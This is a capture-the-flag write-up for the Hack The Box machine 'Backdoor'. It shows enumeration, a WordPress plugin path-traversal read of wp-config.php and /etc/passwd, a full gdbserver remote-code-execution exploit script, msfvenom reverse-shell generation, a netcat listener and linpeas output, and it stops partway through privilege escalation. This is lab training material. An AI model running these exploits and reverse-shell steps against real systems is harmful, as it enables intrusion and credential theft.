# Backdoor

This is my write-up for the room Backdoor


## Difficulty
My Difficulty: Medium (this box I was forced to really dig for enumeration and learn a few things that I have never done before. 

Try Hackme Difficulty: Easy

![Backdoor](https://user-images.githubusercontent.com/68706090/162359563-fdbf1f27-0a84-42d8-883a-aa19f08da8d2.png)

# Enumeration

### NMAP

 ```console
 noob2uub@kali:~$ nmap -sV -sC -A T4 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 11:23 PDT
Failed to resolve "T4".
Nmap scan report for 10.10.11.125
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.91 seconds
noob2uub@kali:~$ cd Documents/
```
# Word Press Site

![Screenshot_2022-04-07_11-25-07](https://user-images.githubusercontent.com/68706090/162272121-77a8a86b-310f-4fd2-8ef6-c547a1016ae3.png)

Nothing to really look at on the site so I will start a GOBUSTER directory scan. 

# GOBUSTER

```console
noob2uub@kali:~/Documents/HTB/backdoor$ gobuster dir -u http://10.10.11.125 -w /home/noob2uub/Documents/Wordlists/common.txt -x php,html,txt                         
===============================================================                                                                                                      
Gobuster v3.1.0                                                                                                                                                      
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                        
===============================================================                                                                                                      
[+] Url:                     http://10.10.11.125                                                                                                                     
[+] Method:                  GET                                                                                                                                     
[+] Threads:                 10                                                                                                                                      
[+] Wordlist:                /home/noob2uub/Documents/Wordlists/common.txt                                                                                           
[+] Negative Status codes:   404                                                                                                                                     
[+] User Agent:              gobuster/3.1.0                                                                                                                          
[+] Extensions:              php,html,txt                                                                                                                            
[+] Timeout:                 10s
===============================================================
2022/04/07 11:28:52 Starting gobuster in directory enumeration mode
===============================================================
/.hta.html            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.11.125/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.11.125/]
/license.txt          (Status: 200) [Size: 19915]                       
/readme.html          (Status: 200) [Size: 7346]                        
/server-status        (Status: 403) [Size: 277]                         
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.11.125/wp-admin/]
/wp-blog-header.php   (Status: 200) [Size: 0]                                      
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.11.125/wp-content/]
/wp-config.php        (Status: 200) [Size: 0]                                        
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.11.125/wp-includes/]
/wp-load.php          (Status: 200) [Size: 0]                                         
/wp-cron.php          (Status: 200) [Size: 0]                                         
/wp-login.php         (Status: 200) [Size: 5674]                                      
/wp-links-opml.php    (Status: 200) [Size: 223]                                       
/wp-mail.php          (Status: 403) [Size: 2616]                                      
/wp-signup.php        (Status: 302) [Size: 0] [--> http://10.10.11.125/wp-login.php?action=register]
/wp-trackback.php     (Status: 200) [Size: 135]                                                     
/wp-settings.php      (Status: 500) [Size: 0]                                                       
/xmlrpc.php           (Status: 405) [Size: 42]                                                      
/xmlrpc.php           (Status: 405) [Size: 42]                                                      
                                                                                                    
===============================================================
2022/04/07 11:30:05 Finished
===============================================================
```

I found a few interesteding things to look at. Lets start digging around. 

### WP-Login

When I attempted to just put a random user name in it, tell me that its an invalid user name. 

![Screenshot_2022-04-07_11-32-01](https://user-images.githubusercontent.com/68706090/162272780-8bb7a98c-3b4a-4302-bd08-960807e9d616.png)

However, if I use Admin, it just tells me that I have an invalid password. Lets keep looking at what else we can do, but perhaps we can run hydra on this.

![Screenshot_2022-04-07_11-32-19](https://user-images.githubusercontent.com/68706090/162272832-c742a13b-ec55-4da8-9839-c867d4baa823.png)


### WP-Includes

If I can get into the site I can use this to perhaps launch a reverse shell. 

![Screenshot_2022-04-07_11-43-31](https://user-images.githubusercontent.com/68706090/162274546-eb0b073c-a5a6-483f-9f3a-6cad123d2989.png)

After messing around with this some time, I decided to further enumare WP

### What WEB

```console
noob2uub@kali:~/Documents/HTB/backdoor$ whatweb 10.10.11.125
http://10.10.11.125 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]
```

We find that it is running word press 5.8.1

### SEARCHSPLOIT

```console
noob2uub@kali:~$ searchsploit wordpress 5.8.1
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                          | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                        | php/webapps/48918.sh
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

This site is not running any of these pluging so lets continue to enumerate. 

### NUCLEI

Lets further enumerate the WP site

```Console
noob2uub@kali:~$ nuclei -u http://10.10.11.125

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   2.6.5

                projectdiscovery.io

[WRN] Use with caution. You are responsible for your actions.
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[INF] Using Nuclei Engine 2.6.5 (latest)
[INF] Using Nuclei Templates 8.9.4 (latest)
[INF] Templates added in last update: 20
[INF] Templates loaded for scan: 3120
[INF] Templates clustered: 530 (Reduced 487 HTTP Requests)
[2022-04-07 13:03:10] [addeventlistener-detect] [http] [info] http://10.10.11.125
[2022-04-07 13:03:10] [wordpress-detect] [http] [info] http://10.10.11.125 [5.8.1]
[2022-04-07 13:03:10] [apache-detect] [http] [info] http://10.10.11.125 [Apache/2.4.41 (Ubuntu)]
[2022-04-07 13:03:10] [email-extractor] [http] [info] http://10.10.11.125 [wordpress@example.com]
[2022-04-07 13:03:10] [tech-detect:google-font-api] [http] [info] http://10.10.11.125
[INF] Using Interactsh Server: oast.me
[2022-04-07 13:03:13] [metatag-cms] [http] [info] http://10.10.11.125 [WordPress 5.8.1]
[2022-04-07 13:03:14] [http-missing-security-headers:content-security-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:permission-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:x-frame-options] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:access-control-expose-headers] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:access-control-allow-methods] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:access-control-allow-credentials] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:strict-transport-security] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:x-content-type-options] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:referrer-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:clear-site-data] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:access-control-allow-origin] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://10.10.11.125
[2022-04-07 13:03:14] [http-missing-security-headers:access-control-max-age] [http] [info] http://10.10.11.125
[2022-04-07 13:03:19] [CVE-2016-10924] [http] [high] http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
[2022-04-07 13:03:20] [waf-detect:apachegeneric] [http] [info] http://10.10.11.125/
[2022-04-07 13:03:20] [waf-detect:ats] [http] [info] http://10.10.11.125/
[2022-04-07 13:03:24] [host-header-injection] [http] [info] http://10.10.11.125
[2022-04-07 13:03:26] [CVE-2017-5487] [http] [medium] http://10.10.11.125/?rest_route=/wp/v2/users/ [admin]
[2022-04-07 13:03:27] [wordpress-login] [http] [info] http://10.10.11.125/wp-login.php
[2022-04-07 13:03:34] [wordpress-directory-listing] [http] [info] http://10.10.11.125/wp-content/uploads/
[2022-04-07 13:03:34] [wordpress-directory-listing] [http] [info] http://10.10.11.125/wp-content/plugins/
[2022-04-07 13:03:34] [wordpress-directory-listing] [http] [info] http://10.10.11.125/wp-includes/
[2022-04-07 13:03:35] [wordpress-xmlrpc-file] [http] [info] http://10.10.11.125/xmlrpc.php
```

We have one High vulnerbility, so lets take a look at that. 

Downloading the file provides us with SQLDB Credentials, but they don't seem to work when I go to login. Now that I know that a directory traversal is possible lets see about etc/passwd

```console

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```
Navigating to: http://wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd

```console
../../../../../../etc/passwd../../../../../../etc/passwd../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
<script>window.close()</script>
```
I can see that we have a user name of user, but I can't seem to find anything. I spent about an hour doing more research feeling like I was missing thing something very important. So I decided to reset the box and enumerate further. I found another port open by forcing it to scan all ports.

### NMAP 

```console
noob2uub@kali:~/Documents/Tools$ sudo nmap -sC -sV -p1-65535 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 14:17 PDT
Nmap scan report for 10.10.11.125
Host is up (0.038s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.62 seconds
noob2uub@kali:~/Documents/Tools$ 
```

I found port 1337, lets look into this. I can't find anything on this except waste means "elite" I spent more time researching LFI and found this resource that had me look into the PID.

https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html

So lets use WFUZZ to find out what PIDS I can get. 

### WFUZZ

```console
noob2uub@kali:~/Documents/Tools$ wfuzz -u http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline
Total requests: 1000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                             
=====================================================================

000000861:   200        0 L      8 W        138 Ch      "861"                                                                                               
000000858:   200        0 L      11 W       181 Ch      "858"                                                                                               
000000852:   200        0 L      12 W       183 Ch      "852"                                                                                               
000000902:   200        0 L      3 W        128 Ch      "902"                                                                                               

Total time: 0
Processed Requests: 1000
Filtered Requests: 996
Requests/sec.: 0
```
so now lets check out those four PID's

```console
noob2uub@kali:~/Documents/Tools$ cat test.txt
/proc/902/cmdline/proc/902/cmdline/proc/902/cmdline/sbin/agetty-o-p -- \u--nocleartty1linux<script>window.close()</script>noob2uub@kali:~/Documents/Tools$ cat test.turl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/852/cmdline --output test.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   183  100   183    0     0   2380      0 --:--:-- --:--:-- --:--:--  2376
noob2uub@kali:~/Documents/Tools$ cat test.txt
/proc/852/cmdline/proc/852/cmdline/proc/852/cmdline/bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done<script>window.close()</script>noob2uub@kali:~/Documents/Tools$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/852/cmdline --outpu                                 url http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/858/cmdline --output test.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   181  100   181    0     0   2354      0 --:--:-- --:--:-- --:--:--  2381
noob2uub@kali:~/Documents/Tools$ cat test.txt
/proc/858/cmdline/proc/858/cmdline/proc/858/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done<script>window.close()</script>noob2uub@kali:~/Documurl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/861/cmdline --output test.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   138  100   138    0     0   1803      0 --:--:-- --:--:-- --:--:--  1815
noob2uub@kali:~/Documents/Tools$ cat test.txt
/proc/861/cmdline/proc/861/cmdline/proc/861/cmdlinesshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups<script>window.close()</script>noob2uub@kali:~/Documents/Tools$                                                                                                        
```

I see something interested. User is running gdbserver on port 1337. This was the headache port until I reset the box. 

Searching gbdserver I find this exploit.

# Exploit

### GNU gdbserver 9.2 - Remote Command Execution (RCE)

``` console
# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
# Date: 2021-11-21
# Exploit Author: Roberto Gesteira Miñarro (7Rocky)
# Vendor Homepage: https://www.gnu.org/software/gdb/
# Software Link: https://www.gnu.org/software/gdb/download/
# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2
# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)

#!/usr/bin/env python3


import binascii
import socket
import struct
import sys

help = f'''
Usage: python3 {sys.argv[0]} <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin



def checksum(s: str) -> str:
    res = sum(map(ord, s)) % 256
    return f'{res:2x}'


def ack(sock):
    sock.send(b'+')


def send(sock, s: str) -> str:
    sock.send(f'${s}#{checksum(s)}'.encode())
    res = sock.recv(1024)
    ack(sock)
    return res.decode()


def exploit(sock, payload: str):
    send(sock, 'qSupported:multiprocess+;qRelocInsn+;qvCont+;')
    send(sock, '!')

    try:
        res = send(sock, 'vCont;s')
        data = res.split(';')[2]
        arch, pc = data.split(':')
    except Exception:
        print('[!] ERROR: Unexpected response. Try again later')
        exit(1)

    if arch == '10':
        print('[+] Found x64 arch')
        pc = binascii.unhexlify(pc[:pc.index('0*')])
        pc += b'\0' * (8 - len(pc))
        addr = hex(struct.unpack('<Q', pc)[0])[2:]
        addr = '0' * (16 - len(addr)) + addr
    elif arch == '08':
        print('[+] Found x86 arch')
        pc = binascii.unhexlify(pc)
        pc += b'\0' * (4 - len(pc))
        addr = hex(struct.unpack('<I', pc)[0])[2:]
        addr = '0' * (8 - len(addr)) + addr

    hex_length = hex(len(payload))[2:]

    print('[+] Sending payload')
    send(sock, f'M{addr},{hex_length}:{payload}')
    send(sock, 'vCont;c')


def main():
    if len(sys.argv) < 3:
        print(help)
        exit(1)

    ip, port = sys.argv[1].split(':')
    file = sys.argv[2]

    try:
        with open(file, 'rb') as f:
            payload = f.read().hex()
    except FileNotFoundError:
        print(f'[!] ERROR: File {file} not found')
        exit(1)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((ip, int(port)))
        print('[+] Connected to target. Preparing exploit')
        exploit(sock, payload)
        print('[*] Pwned!! Check your listener')


if __name__ == '__main__':
    main()

 ``` 
 
  I also found this write up which walks your through the exploit. https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver

### MSF Venom
```console  
noob2uub@kali:~/Documents/HTB/backdoor$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.156 LPORT=4444 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin
```
### NC Listener

``` console
noob2uub@kali:~/Documents/HTB/backdoor$ nc -nlvp 4444
listening on [any] 4444 ...
```

I added the exploid and saved it as exploit.py and made the rev.bin file that was created when I executed MSF Venom executable by running chmod -x

```console
noob2uub@kali:~/Documents/HTB/backdoor$ chmod +x rev.bin 
noob2uub@kali:~/Documents/HTB/backdoor$ python3 {sys.argv[0]} 10.10.11.125:1337 rev.bin
python3: can't open file '/home/noob2uub/Documents/HTB/backdoor/{sys.argv[0]}': [Errno 2] No such file or directory
noob2uub@kali:~/Documents/HTB/backdoor$ python3 exploit.py 10.10.11.125:1337 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

looks like we have something and lets stabolize the shell

``` console
noob2uub@kali:~/Documents/HTB/backdoor$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.156] from (UNKNOWN) [10.10.11.125] 59734
whoami
user
python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 2: python: not found
python3 -c 'import pty; pty.spawn("/bin/bash")'
user@Backdoor:/home/user$ 

```
# Privledge Escalation 

### Linpeas

Now lets work on getting linpeas over to out victim system by creating a webserver and running wget on the victim systems.

``` console
noob2uub@kali:~/Documents/HTB/backdoor$ python3 -m http.server --bind 10.10.14.156 8080
Serving HTTP on 10.10.14.156 port 8080 (http://10.10.14.156:8080/) ...
10.10.11.125 - - [07/Apr/2022 18:34:05] "GET /linpeas.sh HTTP/1.1" 200 -
10.10.11.125 - - [07/Apr/2022 18:35:51] "GET /linpeas.sh HTTP/1.1" 200 -
```

```console
user@Backdoor:/home/user$ wget 10.10.14.156:8080/linpeas.sh -P /home/user            
wget 10.10.14.156:8080/linpeas.sh -P /home/user
--2022-04-08 01:35:51--  http://10.10.14.156:8080/linpeas.sh
Connecting to 10.10.14.156:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 765823 (748K) [text/x-sh]
Saving to: ‘/home/user/linpeas.sh’

linpeas.sh          100%[===================>] 747.87K  1017KB/s    in 0.7s    

2022-04-08 01:35:51 (1017 KB/s) - ‘/home/user/linpeas.sh’ saved [765823/765823]

user@Backdoor:/home/user$ ls
ls
linpeas.sh  user.txt
user@Backdoor:/home/user$ 
```
### Linpeas

```console
user@Backdoor:/home/user$ ./linpeas.sh -a > /dev/shm/linpeas.txt 
./linpeas.sh -a > /dev/shm/linpeas.txt 
bash: ./linpeas.sh: Permission denied
user@Backdoor:/home/user$ chmod +x linpeas.sh
chmod +x linpeas.sh
user@Backdoor:/home/user$ ./linpeas.sh 
./linpeas.sh
```

You can see that i was getting permission denied. Some times you just had to much to drink and cant think of what to do, but its a good think I was not at that tipping point just yet. Of course chmod to make the file executable. 

```console
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                                                                                                    
                                         ╚═══════════════════╝                                                                                                                                                                             
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                
strings Not Found                                                                                                                                                                                                                          
-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                  
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23K May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 463K Jul 23  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 67K Jul 14  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 84K Jul 14  2021 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 67K Jul 21  2020 /usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 464K Feb 23  2021 /usr/bin/screen  --->  GNU_Screen_4.5.0
-rwsr-xr-x 1 root root 39K Jul 21  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 55K Jul 21  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 52K Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 31K May 26  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
```
More Linpeas exerts 
``` console
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════      
                          ╚════════════════════════════════════════════════╝                                
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                  
root           1  0.0  0.5 103784 11356 ?        Ss   02:07   0:03 /sbin/init auto automatic-ubiquity noprompt
root         486  0.0  0.5  62504 10812 ?        S<s  02:07   0:02 /lib/systemd/systemd-journald
root         512  0.0  0.2  21236  5340 ?        Ss   02:07   0:01 /lib/systemd/systemd-udevd
systemd+     524  0.0  0.3  18408  7548 ?        Ss   02:07   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
root         659  0.0  0.9 345816 18220 ?        SLsl 02:07   0:02 /sbin/multipathd -d -s
systemd+     683  0.0  0.6  23896 12196 ?        Ss   02:07   0:00 /lib/systemd/systemd-resolved
systemd+     685  0.0  0.3  90228  6076 ?        Ssl  02:07   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         701  0.0  0.5  47540 10356 ?        Ss   02:07   0:00 /usr/bin/VGAuthService
root         702  0.1  0.4 311500  8196 ?        Ssl  02:07   0:06 /usr/bin/vmtoolsd
root         754  0.0  0.3 235564  7288 ?        Ssl  02:07   0:00 /usr/lib/accountsservice/accounts-daemon
message+     755  0.0  0.2   7596  4688 ?        Ss   02:07   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         763  0.0  0.1  81960  3716 ?        Ssl  02:07   0:00 /usr/sbin/irqbalance --foreground
root         768  0.0  0.9  28996 18120 ?        Ss   02:07   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog       769  0.0  0.2 224348  5396 ?        Ssl  02:07   0:00 /usr/sbin/rsyslogd -n -iNONE
root         771  0.0  0.3  16704  7616 ?        Ss   02:07   0:00 /lib/systemd/systemd-logind
root         810  0.0  0.1   6812  2992 ?        Ss   02:07   0:00 /usr/sbin/cron -f
root         814  0.0  0.1   8352  3440 ?        S    02:07   0:00  _ /usr/sbin/CRON -f
root         851  0.0  0.0   2608  1800 ?        Ss   02:07   0:00  |   _ /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
root       33157  0.0  0.1   8404  3868 ?        S    03:01   0:00  |       _ su user -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
user       33182  0.0  0.1   6892  3316 ?        Ss   03:01   0:00  |           _ bash -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
user       33184  0.0  0.1  11844  3500 ?        S    03:01   0:00  |               _ gdbserver --once 0.0.0.0:1337 /bin/true
user       33189  0.0  0.0    376     4 ?        t    03:01   0:00  |                   _ /bin/true
root         815  0.0  0.1   8352  3440 ?        S    02:07   0:00  _ /usr/sbin/CRON -f
